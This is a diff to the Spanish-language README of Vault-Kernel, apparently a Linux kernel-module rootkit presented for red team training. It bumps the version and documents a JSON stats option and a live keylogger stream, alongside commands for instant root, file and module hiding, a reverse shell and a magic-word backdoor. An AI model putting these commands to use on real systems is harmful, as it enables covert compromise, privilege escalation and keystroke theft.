@@ -5,7 +5,7 @@
 <div align="center">
 
 [![CI](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/Ruby570bocadito/Vault-Kernel/actions/workflows/ci.yml)
-![Version](https://img.shields.io/badge/Version-3.4-8A2BE2?style=flat)
+![Version](https://img.shields.io/badge/Version-3.5-8A2BE2?style=flat)
 ![Language](https://img.shields.io/badge/Language-C-CC0000?style=flat&logo=c&logoColor=white)
 ![Client](https://img.shields.io/badge/Client-Go-00ADD8?style=flat&logo=go&logoColor=white)
 ![Platform](https://img.shields.io/badge/Platform-Linux%20x86__64-FF6600?style=flat&logo=linux&logoColor=white)
@@ -125,6 +125,7 @@ sudo ./vault_kernel stats
 vault_kernel status              # ¿Está cargado el módulo?
 vault_kernel doctor              # Diagnóstico completo del lab (dispositivo, ABI, hooks)
 vault_kernel stats               # Estadísticas en vivo (hooks, contadores, uptime)
+vault_kernel stats --json        # Las mismas estadísticas en JSON para scripting
 vault_kernel give-root [pid]     # Root instantáneo (por defecto: self)
 vault_kernel hide-file <name>    # Ocultar fichero/directorio
 vault_kernel unhide-file <name>  # Revelar fichero/directorio
@@ -137,6 +138,7 @@ vault_kernel shell <ip:port>     # Reverse shell vía usermodehelper
 vault_kernel magic <word>        # Activar backdoor de palabra mágica
 vault_kernel magic-encode <word> <port>  # Imprimir el kill() listo para disparar
 vault_kernel keylog              # Leer pulsaciones capturadas
+vault_kernel keylog --follow     # Stream en vivo de pulsaciones (Ctrl-C para parar)
 vault_kernel keylog-clear        # Limpiar buffer del keylogger
 vault_kernel hide-module         # Ocultar de lsmod
 vault_kernel unhide-module       # Revelar en lsmod
@@ -310,5 +312,5 @@ Vault-Kernel is a Linux **LKM rootkit engine** for red team training and authori
 **License:** MIT — see [LICENSE](LICENSE). Built for learning; use it only where you have written permission.
 
 <div align="center">
-  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.4</sub>
+  <sub>Built with 🔥 by <a href="https://github.com/Ruby570bocadito">Ruby570bocadito</a> — Vault-Kernel v3.5</sub>
 </div>
